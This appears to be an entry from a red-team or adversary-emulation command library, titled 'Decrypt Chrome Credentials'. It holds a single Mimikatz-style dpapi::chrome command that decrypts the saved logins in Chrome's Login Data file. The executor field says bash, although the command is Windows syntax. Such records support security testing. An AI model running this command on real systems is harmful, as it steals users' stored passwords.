---
id: e96015fe-2f43-4ebd-b8e6-b45e4d08abb4
name: Decrypt Chrome Credentials
type: command
executor: bash
data: dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data"
  /unprotect
output: null
created_at: '2023-04-06T03:56:27.512811+00:00'
updated_at: '2023-04-10T20:37:19.522854+00:00'
---

# Decrypt Chrome Credentials

```bash
dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotect
```
